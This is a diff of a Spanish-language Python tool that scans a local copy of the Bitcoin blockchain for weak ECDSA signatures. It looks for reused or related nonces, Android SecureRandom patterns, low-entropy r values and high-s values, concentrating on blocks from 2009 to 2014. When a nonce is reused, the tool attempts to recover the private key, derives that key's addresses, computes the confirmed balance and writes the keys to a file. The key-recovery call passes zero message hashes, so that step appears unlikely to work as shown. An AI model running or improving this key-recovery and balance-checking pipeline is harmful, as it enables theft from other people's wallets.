@@ -1,12 +1,22 @@
 """
 scanner_offline.py
 ==================
-Escanea archivos blk*.dat de Bitcoin Core buscando patrones de ECDSA inseguros:
-  1) Nonce reuse exacto (mismo r)
-  2) Nonces relacionados (prefijo compartido / diferencia pequeña)
-  3) Candidatos Android SecureRandom (heurística)
+Escáner offline para archivos blk*.dat de Bitcoin Core.
 
-No requiere internet: parsea bloques directamente desde disco.
+Métodos de detección implementados:
+  1) nonce reuse exacto (mismo r)
+  2) nonces relacionados (prefijos compartidos / diferencia pequeña)
+  3) heurística Android SecureRandom
+  4) patrones de sesgo/entropía baja en r (tiny-r, many-leading-zeros)
+  5) firmas de alta maleabilidad (high-s)
+
+Incluye:
+  - Soporte XOR (xor.dat)
+  - Parser de bloques/tx legacy + segwit
+  - Export CSV incremental
+  - Checkpoint
+  - Recuperación de clave (cuando aplica)
+  - Estimación de saldo confirmado offline para claves recuperadas
 """
 
 from __future__ import annotations
@@ -19,11 +29,17 @@ import math
 import struct
 import sys
 import time
+from dataclasses import dataclass
 from pathlib import Path
 from typing import Iterator
 
-import base58
-from ecdsa import SECP256k1, SigningKey
+try:
+    from ecdsa import SECP256k1, SigningKey
+    ECDSA_AVAILABLE = True
+except ImportError:
+    SECP256k1 = None  # type: ignore
+    SigningKey = None  # type: ignore
+    ECDSA_AVAILABLE = False
 
 try:
     from bech32 import bech32_encode, convertbits
@@ -32,30 +48,47 @@ try:
 except ImportError:
     BECH32_AVAILABLE = False
 
-
-# ==================== CONFIGURACIÓN ====================
+# ==================== CONFIG ====================
 OUTPUT_CSV = "repeated_r_offline.csv"
 RELATED_CSV = "related_nonce_offline.csv"
 ANDROID_CSV = "android_securerandom.csv"
+WEAK_NONCE_CSV = "weak_nonce_patterns_offline.csv"
+MALLEABILITY_CSV = "high_s_malleability_offline.csv"
 KEYS_FILE = "recovered_keys_offline.txt"
 CHECKPOINT_FILE = "checkpoint_offline.json"
 
 CHECKPOINT_EVERY = 10_000
 MAX_BLOCKS = 335_000
 
+MAINNET_MAGIC = b"\xf9\xbe\xb4\xd9"
+CURVE_N = SECP256k1.order if ECDSA_AVAILABLE else 0
+
 RELATED_PREFIX_LEN = 16
 RELATED_SMALL_DIFF = 2**40
-
 ANDROID_PREFIX_LEN = 16
 ANDROID_DIFF_MAX = 2**128
 
-MAINNET_MAGIC = b"\xf9\xbe\xb4\xd9"
-CURVE_N = SECP256k1.order
+# 2009-2014 (inclusive) usando block header time
+DEFAULT_START_TS = 1231006505  # 2009-01-03
+DEFAULT_END_TS = 1420070399  # 2014-12-31 23:59:59 UTC
+
+
+@dataclass
+class ScanOptions:
+    blk_dir: Path
+    max_blocks: int
+    start_ts: int
+    end_ts: int
+    detect_exact: bool
+    detect_related: bool
+    detect_android: bool
+    detect_bias: bool
+    detect_malleability: bool
+    weak_r_bits: int
+    weak_r_leading_hex: int
 
 
 class BloomFilter:
-    """Bloom filter simple para membership de r en O(1) con bajo RAM."""
-
     def __init__(self, capacity: int = 5_000_000, error_rate: float = 1e-5) -> None:
         self.size = max(1, int(-capacity * math.log(error_rate) / (math.log(2) ** 2)))
         self.hash_count = max(1, int(self.size / capacity * math.log(2)))
@@ -154,7 +187,7 @@ def get_blk_files(blk_dir: Path) -> list[Path]:
 
 
 def extract_der_candidates(script_hex: str) -> list[str]:
-    """Extrae múltiples DER candidates desde un scriptSig (incl. multisig)."""
+    """Extrae múltiples DER desde scriptSig (incluye OP_PUSHDATA1/2)."""
     try:
         raw = bytes.fromhex(script_hex)
     except ValueError:
@@ -171,10 +204,10 @@ def extract_der_candidates(script_hex: str) -> list[str]:
             continue
         if 1 <= op <= 75:
             ln = op
-        elif op == 76 and i < n:  # OP_PUSHDATA1
+        elif op == 76 and i < n:
             ln = raw[i]
             i += 1
-        elif op == 77 and i + 1 < n:  # OP_PUSHDATA2
+        elif op == 77 and i + 1 < n:
             ln = raw[i] | (raw[i + 1] << 8)
             i += 2
         else:
@@ -183,11 +216,10 @@ def extract_der_candidates(script_hex: str) -> list[str]:
         if i + ln > n:
             break
 
-        candidate = raw[i : i + ln]
+        cand = raw[i : i + ln]
         i += ln
-        if len(candidate) > 8 and candidate[0] == 0x30:
-            # Último byte suele ser sighash type; guardamos DER sin sighash
-            der = candidate[:-1] if candidate[-1] in (1, 2, 3, 0x81, 0x82, 0x83) else candidate
+        if len(cand) > 8 and cand[0] == 0x30:
+            der = cand[:-1] if cand[-1] in (1, 2, 3, 0x81, 0x82, 0x83) else cand
             if der and der[0] == 0x30:
                 out.append(der.hex())
     return out
@@ -220,12 +252,14 @@ def parse_rs_from_der(sig_hex: str) -> tuple[int | None, int | None]:
         return None, None
 
 
-def parse_block(block: bytes) -> tuple[str | None, list[dict]]:
+def parse_block(block: bytes) -> tuple[str | None, int | None, list[dict]]:
     try:
         pos = 0
         header = block[:80]
         pos += 80
+
         block_hash = hashlib.sha256(hashlib.sha256(header).digest()).digest()[::-1].hex()
+        block_time = struct.unpack_from("<I", header, 68)[0]
 
         tx_count, pos = read_varint(block, pos)
         txs: list[dict] = []
@@ -249,7 +283,7 @@ def parse_block(block: bytes) -> tuple[str | None, list[dict]]:
                 script_len, pos = read_varint(block, pos)
                 script_sig = block[pos : pos + script_len].hex()
                 pos += script_len
-                pos += 4  # sequence
+                pos += 4
 
                 inputs.append({"prev_txid": prev_txid, "prev_vout": prev_vout, "scriptsig": script_sig})
 
@@ -263,56 +297,70 @@ def parse_block(block: bytes) -> tuple[str | None, list[dict]]:
                 pos += slen
                 outputs.append({"value": value, "scriptpubkey": script_pubkey})
 
+            witness: list[list[bytes]] = []
             if segwit:
                 for _ in range(vin_n):
-                    wcount, pos = read_varint(block, pos)
-                    for _ in range(wcount):
+                    witems_n, pos = read_varint(block, pos)
+                    items: list[bytes] = []
+                    for _ in range(witems_n):
                         wlen, pos = read_varint(block, pos)
+                        items.append(block[pos : pos + wlen])
                         pos += wlen
+                    witness.append(items)
 
-            pos += 4  # locktime
+            pos += 4
             tx_raw = block[tx_start:pos]
             txid = hashlib.sha256(hashlib.sha256(tx_raw).digest()).digest()[::-1].hex()
-            txs.append({"txid": txid, "inputs": inputs, "outputs": outputs})
 
-        return block_hash, txs
+            txs.append({"txid": txid, "inputs": inputs, "outputs": outputs, "witness": witness})
+
+        return block_hash, block_time, txs
     except Exception:
-        return None, []
+        return None, None, []
 
 
+
+
+def ensure_crypto_dependencies() -> None:
+    if not ECDSA_AVAILABLE:
+        raise RuntimeError("Dependencia faltante: ecdsa. Instala con `pip install ecdsa`.")
 def hash160(data: bytes) -> bytes:
     return hashlib.new("ripemd160", hashlib.sha256(data).digest()).digest()
 
 
 def extract_h160_from_scriptpubkey(script_hex: str) -> str | None:
-    """Soporta P2PKH y P2WPKH para estimar saldo de clave recuperada."""
-    # P2PKH: OP_DUP OP_HASH160 PUSH20 <h160> OP_EQUALVERIFY OP_CHECKSIG
     if script_hex.startswith("76a914") and script_hex.endswith("88ac") and len(script_hex) == 50:
         return script_hex[6:46]
-    # P2WPKH: OP_0 PUSH20 <h160>
     if script_hex.startswith("0014") and len(script_hex) == 44:
         return script_hex[4:44]
     return None
 
 
 def private_key_to_addresses(priv_hex: str) -> tuple[str, str]:
+    ensure_crypto_dependencies()
+    try:
+        import base58
+    except ImportError:
+        return "base58_no_disponible", "base58_no_disponible"
+
     try:
         raw = bytes.fromhex(priv_hex)
         if len(raw) != 32:
             return "INVALIDA", "INVALIDA"
+
         sk = SigningKey.from_string(raw, curve=SECP256k1)
         vk = sk.verifying_key
         x = vk.pubkey.point.x().to_bytes(32, "big")
         y = vk.pubkey.point.y()
-        pub = (b"\x02" if (y % 2 == 0) else b"\x03") + x
+        pub = (b"\x02" if y % 2 == 0 else b"\x03") + x
 
-        h = hash160(pub)
-        payload = b"\x00" + h
+        h160 = hash160(pub)
+        payload = b"\x00" + h160
         checksum = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
         legacy = base58.b58encode(payload + checksum).decode("ascii")
 
         if BECH32_AVAILABLE:
-            segwit = bech32_encode("bc", [0] + convertbits(h, 8, 5))
+            segwit = bech32_encode("bc", [0] + convertbits(h160, 8, 5))
         else:
             segwit = legacy
         return legacy, segwit
@@ -321,6 +369,8 @@ def private_key_to_addresses(priv_hex: str) -> tuple[str, str]:
 
 
 def private_key_to_h160(priv_hex: str) -> str | None:
+    if not ECDSA_AVAILABLE:
+        return None
     try:
         raw = bytes.fromhex(priv_hex)
         if len(raw) != 32:
@@ -329,56 +379,15 @@ def private_key_to_h160(priv_hex: str) -> str | None:
         vk = sk.verifying_key
         x = vk.pubkey.point.x().to_bytes(32, "big")
         y = vk.pubkey.point.y()
-        pub = (b"\x02" if (y % 2 == 0) else b"\x03") + x
+        pub = (b"\x02" if y % 2 == 0 else b"\x03") + x
         return hash160(pub).hex()
     except Exception:
         return None
 
 
-def compute_confirmed_balance_sats(
-    blk_dir: Path,
-    xor_key: bytes,
-    target_h160: str,
-    max_blocks: int,
-) -> int:
-    """Calcula saldo confirmado (satoshis) para un h160 escaneando blockchain local."""
-    utxos: dict[tuple[str, int], int] = {}
-    processed = 0
-
-    for blk_file in get_blk_files(blk_dir):
-        for block in iter_blk_file(blk_file, xor_key):
-            if processed >= max_blocks:
-                break
-
-            _, txs = parse_block(block)
-            if not txs:
-                processed += 1
-                continue
-
-            for tx in txs:
-                txid = tx["txid"]
-
-                for inp in tx["inputs"]:
-                    prev_txid = inp.get("prev_txid")
-                    prev_vout = inp.get("prev_vout")
-                    key = (prev_txid, prev_vout)
-                    if key in utxos:
-                        del utxos[key]
-
-                for vout, out in enumerate(tx.get("outputs", [])):
-                    h160 = extract_h160_from_scriptpubkey(out.get("scriptpubkey", ""))
-                    if h160 == target_h160:
-                        utxos[(txid, vout)] = int(out.get("value", 0))
-
-            processed += 1
-
-        if processed >= max_blocks:
-            break
-
-    return sum(utxos.values())
-
-
 def recover_private_key(z1: int, z2: int, s1: int, s2: int, r: int) -> int | None:
+    if not ECDSA_AVAILABLE:
+        return None
     if s1 == s2:
         return None
     den = (r * ((s1 - s2) % CURVE_N)) % CURVE_N
@@ -412,10 +421,72 @@ def save_checkpoint(count: int) -> None:
     Path(CHECKPOINT_FILE).write_text(json.dumps({"blocks_processed": count}), encoding="utf-8")
 
 
-def scan(blk_dir: Path, max_blocks: int) -> int:
-    blk_files = get_blk_files(blk_dir)
+def compute_confirmed_balance_sats(
+    blk_dir: Path,
+    xor_key: bytes,
+    target_h160: str,
+    max_blocks: int,
+    start_ts: int,
+    end_ts: int,
+) -> int:
+    utxos: dict[tuple[str, int], int] = {}
+    processed = 0
+
+    for blk_file in get_blk_files(blk_dir):
+        for block in iter_blk_file(blk_file, xor_key):
+            if processed >= max_blocks:
+                break
+
+            _, block_time, txs = parse_block(block)
+            if not txs:
+                processed += 1
+                continue
+
+            if block_time is None or not (start_ts <= block_time <= end_ts):
+                processed += 1
+                continue
+
+            for tx in txs:
+                txid = tx["txid"]
+
+                for inp in tx["inputs"]:
+                    key = (inp.get("prev_txid"), inp.get("prev_vout"))
+                    if key in utxos:
+                        del utxos[key]
+
+                for vout, out in enumerate(tx.get("outputs", [])):
+                    h160 = extract_h160_from_scriptpubkey(out.get("scriptpubkey", ""))
+                    if h160 == target_h160:
+                        utxos[(txid, vout)] = int(out.get("value", 0))
+
+            processed += 1
+
+        if processed >= max_blocks:
+            break
+
+    return sum(utxos.values())
+
+
+def leading_zero_nibbles(hex_string: str) -> int:
+    c = 0
+    for ch in hex_string:
+        if ch == "0":
+            c += 1
+        else:
+            break
+    return c
+
+
+def should_analyze_block_time(ts: int | None, start_ts: int, end_ts: int) -> bool:
+    if ts is None:
+        return False
+    return start_ts <= ts <= end_ts
+
+
+def scan(opts: ScanOptions) -> int:
+    blk_files = get_blk_files(opts.blk_dir)
     if not blk_files:
-        print(f"ERROR: no se encontraron blk*.dat en {blk_dir}")
+        print(f"ERROR: no se encontraron blk*.dat en {opts.blk_dir}")
         sys.exit(1)
 
     bloom = BloomFilter()
@@ -427,20 +498,23 @@ def scan(blk_dir: Path, max_blocks: int) -> int:
     seen_related: set[tuple[str, str, str]] = set()
     seen_android: set[tuple[str, str, str]] = set()
 
-    results = 0
-    rel_count = 0
-    and_count = 0
+    results_exact = 0
+    results_related = 0
+    results_android = 0
+    results_weak = 0
+    results_mall = 0
     keys_count = 0
+
     balance_cache: dict[str, int] = {}
 
-    xor_key = load_xor_key(blk_dir)
+    xor_key = load_xor_key(opts.blk_dir)
     skip = load_checkpoint()
-
     processed = 0
     t0 = time.time()
 
-    print(f"Archivos blk: {len(blk_files)}")
-    print(f"Checkpoint : {skip:,}")
+    print(f"Archivos blk       : {len(blk_files)}")
+    print(f"Rango de tiempo    : {opts.start_ts} - {opts.end_ts}")
+    print(f"Checkpoint bloques : {skip:,}")
 
     for blk_file in blk_files:
         print(f"Leyendo {blk_file.name}...")
@@ -448,17 +522,22 @@ def scan(blk_dir: Path, max_blocks: int) -> int:
             if processed < skip:
                 processed += 1
                 continue
-            if processed >= max_blocks:
+            if processed >= opts.max_blocks:
                 save_checkpoint(processed)
                 return processed
 
-            _, txs = parse_block(block)
+            block_hash, block_time, txs = parse_block(block)
             if not txs:
+                processed += 1
+                continue
+
+            if not should_analyze_block_time(block_time, opts.start_ts, opts.end_ts):
                 processed += 1
                 continue
 
             for tx in txs:
                 txid = tx["txid"]
+
                 for txin in tx["inputs"]:
                     sigs = extract_der_candidates(txin.get("scriptsig", ""))
                     if not sigs:
@@ -471,34 +550,54 @@ def scan(blk_dir: Path, max_blocks: int) -> int:
 
                         r_hex = f"{r:064x}"
 
-                        if (r_hex in bloom) and (r_hex in r_seen):
+                        if opts.detect_exact and (r_hex in bloom) and (r_hex in r_seen):
                             prev = r_seen[r_hex]
                             pair = (r_hex, prev["txid"], txid)
                             if pair not in seen_exact:
                                 seen_exact.add(pair)
-                                results += 1
+                                results_exact += 1
+
                                 priv = recover_private_key(0, 0, prev["s"], s, r)
                                 priv_hex = f"{priv:064x}" if priv else "necesita_sighash"
+
                                 append_csv(
                                     Path(OUTPUT_CSV),
-                                    ["r", "tx1", "sig1", "tx2", "sig2", "private_key"],
-                                    [r_hex, prev["txid"], prev["sig_der"], txid, sig_der, priv_hex],
+                                    ["r", "tx1", "sig1", "tx2", "sig2", "private_key", "block_time", "block_hash"],
+                                    [
+                                        r_hex,
+                                        prev["txid"],
+                                        prev["sig_der"],
+                                        txid,
+                                        sig_der,
+                                        priv_hex,
+                                        str(block_time),
+                                        block_hash or "",
+                                    ],
                                 )
+
                                 if priv:
                                     keys_count += 1
                                     legacy, segwit = private_key_to_addresses(priv_hex)
                                     h160_hex = private_key_to_h160(priv_hex)
+
                                     if h160_hex:
                                         if h160_hex not in balance_cache:
                                             print("  -> calculando saldo confirmado offline...")
                                             balance_cache[h160_hex] = compute_confirmed_balance_sats(
-                                                blk_dir=blk_dir,
+                                                blk_dir=opts.blk_dir,
                                                 xor_key=xor_key,
                                                 target_h160=h160_hex,
-                                                max_blocks=max_blocks,
+                                                max_blocks=opts.max_blocks,
+                                                start_ts=opts.start_ts,
+                                                end_ts=opts.end_ts,
                                             )
                                         balance_sats = balance_cache[h160_hex]
                                         balance_btc = balance_sats / 100_000_000
+                                    else:
+                                        balance_sats = -1
+                                        balance_btc = 0.0
+
+                                    if balance_sats >= 0:
                                         print(
                                             f"  ✓ clave recuperada: {priv_hex}\n"
                                             f"    legacy: {legacy}\n"
@@ -512,6 +611,7 @@ def scan(blk_dir: Path, max_blocks: int) -> int:
                                             f"    segwit: {segwit}\n"
                                             "    saldo confirmado: no disponible"
                                         )
+
                                     with Path(KEYS_FILE).open("a", encoding="utf-8") as f:
                                         f.write(
                                             f"{priv_hex}\t{legacy}\t{segwit}\t{r_hex}\t{prev['txid']}\t{txid}\n"
@@ -521,84 +621,158 @@ def scan(blk_dir: Path, max_blocks: int) -> int:
                             bloom.add(r_hex)
                             r_seen[r_hex] = {"txid": txid, "sig_der": sig_der, "s": s}
 
-                        pref = r_hex[:RELATED_PREFIX_LEN]
-                        prior = prefix_seen.setdefault(pref, [])
-                        for prev in prior:
-                            if prev["r_hex"] == r_hex:
-                                continue
-                            pair = (pref, prev["txid"], txid)
-                            if pair in seen_related:
-                                continue
+                        if opts.detect_related:
+                            pref = r_hex[:RELATED_PREFIX_LEN]
+                            prior = prefix_seen.setdefault(pref, [])
+                            for prev in prior:
+                                if prev["r_hex"] == r_hex:
+                                    continue
+                                pair = (pref, prev["txid"], txid)
+                                if pair in seen_related:
+                                    continue
 
-                            diff = abs(int(prev["r_hex"], 16) - r)
-                            if diff > RELATED_SMALL_DIFF and r_hex[:8] != prev["r_hex"][:8]:
-                                continue
+                                diff = abs(int(prev["r_hex"], 16) - r)
+                                if diff > RELATED_SMALL_DIFF and r_hex[:8] != prev["r_hex"][:8]:
+                                    continue
 
-                            seen_related.add(pair)
-                            rel_count += 1
-                            kind = "RELATED_SMALL_DIFF" if diff <= RELATED_SMALL_DIFF else "SAME_4BYTES_PREFIX"
+                                seen_related.add(pair)
+                                results_related += 1
+                                kind = "RELATED_SMALL_DIFF" if diff <= RELATED_SMALL_DIFF else "SAME_4BYTES_PREFIX"
+
+                                append_csv(
+                                    Path(RELATED_CSV),
+                                    [
+                                        "tipo",
+                                        "r1",
+                                        "r2",
+                                        "tx1",
+                                        "sig1",
+                                        "tx2",
+                                        "sig2",
+                                        "prefix",
+                                        "block_time",
+                                        "block_hash",
+                                    ],
+                                    [
+                                        kind,
+                                        prev["r_hex"],
+                                        r_hex,
+                                        prev["txid"],
+                                        prev["sig_der"],
+                                        txid,
+                                        sig_der,
+                                        pref,
+                                        str(block_time),
+                                        block_hash or "",
+                                    ],
+                                )
+
+                            prior.append({"r_hex": r_hex, "txid": txid, "sig_der": sig_der})
+
+                        if opts.detect_android:
+                            apref = r_hex[:ANDROID_PREFIX_LEN]
+                            aset = android_seen.setdefault(apref, [])
+                            for prev in aset:
+                                if prev["r_hex"] == r_hex:
+                                    continue
+
+                                diff_r = abs(int(prev["r_hex"], 16) - r)
+                                if diff_r > ANDROID_DIFF_MAX:
+                                    continue
+
+                                pair = (apref, prev["txid"], txid)
+                                if pair in seen_android:
+                                    continue
+                                seen_android.add(pair)
+                                results_android += 1
+
+                                conf = "ALTA" if diff_r < 2**32 else ("MEDIA" if diff_r < 2**64 else "BAJA")
+                                append_csv(
+                                    Path(ANDROID_CSV),
+                                    [
+                                        "r1",
+                                        "r2",
+                                        "diff_r",
+                                        "tx1",
+                                        "sig1",
+                                        "tx2",
+                                        "sig2",
+                                        "prefix_8bytes",
+                                        "block_time",
+                                        "block_hash",
+                                        "confianza",
+                                    ],
+                                    [
+                                        prev["r_hex"],
+                                        r_hex,
+                                        hex(diff_r),
+                                        prev["txid"],
+                                        prev["sig_der"],
+                                        txid,
+                                        sig_der,
+                                        apref,
+                                        str(block_time),
+                                        block_hash or "",
+                                        conf,
+                                    ],
+                                )
+                            aset.append({"r_hex": r_hex, "txid": txid})
+
+                        if opts.detect_bias:
+                            r_bits = r.bit_length()
+                            lz = leading_zero_nibbles(r_hex)
+                            if r_bits <= opts.weak_r_bits or lz >= opts.weak_r_leading_hex:
+                                results_weak += 1
+                                reason = "TINY_R" if r_bits <= opts.weak_r_bits else "MANY_LEADING_ZEROS"
+                                append_csv(
+                                    Path(WEAK_NONCE_CSV),
+                                    [
+                                        "tipo",
+                                        "r",
+                                        "s",
+                                        "r_bits",
+                                        "leading_zero_nibbles",
+                                        "txid",
+                                        "sig_der",
+                                        "block_time",
+                                        "block_hash",
+                                    ],
+                                    [
+                                        reason,
+                                        r_hex,
+                                        f"{s:064x}",
+                                        str(r_bits),
+                                        str(lz),
+                                        txid,
+                                        sig_der,
+                                        str(block_time),
+                                        block_hash or "",
+                                    ],
+                                )
+
+                        if opts.detect_malleability and s > (CURVE_N // 2):
+                            results_mall += 1
                             append_csv(
-                                Path(RELATED_CSV),
-                                ["tipo", "r1", "r2", "tx1", "sig1", "tx2", "sig2", "prefix"],
-                                [kind, prev["r_hex"], r_hex, prev["txid"], prev["sig_der"], txid, sig_der, pref],
-                            )
-
-                        prior.append({"r_hex": r_hex, "txid": txid, "sig_der": sig_der})
-
-                        apref = r_hex[:ANDROID_PREFIX_LEN]
-                        aset = android_seen.setdefault(apref, [])
-                        for prev in aset:
-                            if prev["r_hex"] == r_hex:
-                                continue
-
-                            diff_r = abs(int(prev["r_hex"], 16) - r)
-                            if diff_r > ANDROID_DIFF_MAX:
-                                continue
-
-                            pair = (apref, prev["txid"], txid)
-                            if pair in seen_android:
-                                continue
-                            seen_android.add(pair)
-                            and_count += 1
-
-                            conf = "ALTA" if diff_r < 2**32 else ("MEDIA" if diff_r < 2**64 else "BAJA")
-                            append_csv(
-                                Path(ANDROID_CSV),
+                                Path(MALLEABILITY_CSV),
+                                ["tipo", "r", "s", "txid", "sig_der", "block_time", "block_hash"],
                                 [
-                                    "r1",
-                                    "r2",
-                                    "diff_r",
-                                    "tx1",
-                                    "sig1",
-                                    "tx2",
-                                    "sig2",
-                                    "prefix_8bytes",
-                                    "block_approx",
-                                    "confianza",
-                                ],
-                                [
-                                    prev["r_hex"],
+                                    "HIGH_S",
                                     r_hex,
-                                    hex(diff_r),
-                                    prev["txid"],
-                                    prev["sig_der"],
+                                    f"{s:064x}",
                                     txid,
                                     sig_der,
-                                    apref,
-                                    str(processed),
-                                    conf,
+                                    str(block_time),
+                                    block_hash or "",
                                 ],
                             )
-
-                        aset.append({"r_hex": r_hex, "txid": txid})
 
             processed += 1
             if processed % CHECKPOINT_EVERY == 0:
                 elapsed = max(1e-9, time.time() - t0)
                 print(
-                    f"→ {processed:,} bloques | exact:{results} related:{rel_count} "
-                    f"android:{and_count} keys:{keys_count} | "
-                    f"bloom:{bloom.mem_mb():.1f}MB | {(processed/elapsed):.0f} blk/s"
+                    f"→ {processed:,} bloques | exact:{results_exact} related:{results_related} "
+                    f"android:{results_android} weak:{results_weak} high-s:{results_mall} keys:{keys_count} "
+                    f"| bloom:{bloom.mem_mb():.1f}MB | {(processed/elapsed):.0f} blk/s"
                 )
                 save_checkpoint(processed)
 
@@ -607,27 +781,74 @@ def scan(blk_dir: Path, max_blocks: int) -> int:
 
 
 def main() -> None:
-    parser = argparse.ArgumentParser(description="Scanner offline de nonces ECDSA inseguros")
+    parser = argparse.ArgumentParser(description="Scanner offline de vulnerabilidades ECDSA en Bitcoin")
+    parser.add_argument("--blkdir", default=str(Path.home() / "AppData/Roaming/Bitcoin/blocks"), help="Directorio blk*.dat")
+    parser.add_argument("--maxblock", type=int, default=MAX_BLOCKS, help=f"Máximo de bloques a procesar (default {MAX_BLOCKS})")
+
+    # Enfocado en 2009-2014 por defecto
+    parser.add_argument("--start-ts", type=int, default=DEFAULT_START_TS, help="Timestamp Unix mínimo del bloque")
+    parser.add_argument("--end-ts", type=int, default=DEFAULT_END_TS, help="Timestamp Unix máximo del bloque")
+
+    # Selectores de métodos (si no se usa ninguno, todos activos)
+    parser.add_argument("--exact", action="store_true", help="Activar nonce reuse exacto")
+    parser.add_argument("--related", action="store_true", help="Activar nonces relacionados")
+    parser.add_argument("--android", action="store_true", help="Activar heurística Android SecureRandom")
+    parser.add_argument("--bias", action="store_true", help="Activar detección de sesgo/entropía baja en r")
+    parser.add_argument("--malleability", action="store_true", help="Activar detección high-s (malleability)")
+
+    parser.add_argument("--weak-r-bits", type=int, default=240, help="Umbral bit_length para marcar r pequeño")
     parser.add_argument(
-        "--blkdir",
-        default=str(Path.home() / "AppData/Roaming/Bitcoin/blocks"),
-        help="Directorio con blk*.dat",
-    )
-    parser.add_argument(
-        "--maxblock",
+        "--weak-r-leading-hex",
         type=int,
-        default=MAX_BLOCKS,
-        help=f"Número máximo de bloques a procesar (default: {MAX_BLOCKS})",
+        default=6,
+        help="Umbral de nibbles en cero al inicio de r (ej: 6 = 24 bits en cero)",
     )
+
     args = parser.parse_args()
 
+    methods_selected = any([args.exact, args.related, args.android, args.bias, args.malleability])
+    detect_exact = args.exact or not methods_selected
+    detect_related = args.related or not methods_selected
+    detect_android = args.android or not methods_selected
+    detect_bias = args.bias or not methods_selected
+    detect_malleability = args.malleability or not methods_selected
+
+    opts = ScanOptions(
+        blk_dir=Path(args.blkdir),
+        max_blocks=args.maxblock,
+        start_ts=args.start_ts,
+        end_ts=args.end_ts,
+        detect_exact=detect_exact,
+        detect_related=detect_related,
+        detect_android=detect_android,
+        detect_bias=detect_bias,
+        detect_malleability=detect_malleability,
+        weak_r_bits=args.weak_r_bits,
+        weak_r_leading_hex=args.weak_r_leading_hex,
+    )
+
     print("=" * 70)
-    print("SCANNER OFFLINE - ECDSA Weak Nonce Detector")
+    print("SCANNER OFFLINE - Bitcoin ECDSA Vulnerability Finder")
+    print("Métodos:", {
+        "exact": detect_exact,
+        "related": detect_related,
+        "android": detect_android,
+        "bias": detect_bias,
+        "malleability": detect_malleability,
+    })
     print("=" * 70)
-    total = scan(Path(args.blkdir), args.maxblock)
+
+    total = scan(opts)
+
     print("=" * 70)
-    print(f"Escaneo finalizado. Bloques procesados: {total:,}")
-    print(f"Resultados: {OUTPUT_CSV}, {RELATED_CSV}, {ANDROID_CSV}, {KEYS_FILE}")
+    print("Escaneo finalizado")
+    print(f"Bloques procesados: {total:,}")
+    print(f"CSV exacto        : {OUTPUT_CSV}")
+    print(f"CSV related       : {RELATED_CSV}")
+    print(f"CSV android       : {ANDROID_CSV}")
+    print(f"CSV weak nonce    : {WEAK_NONCE_CSV}")
+    print(f"CSV high-s        : {MALLEABILITY_CSV}")
+    print(f"Claves            : {KEYS_FILE}")
 
 
 if __name__ == "__main__":
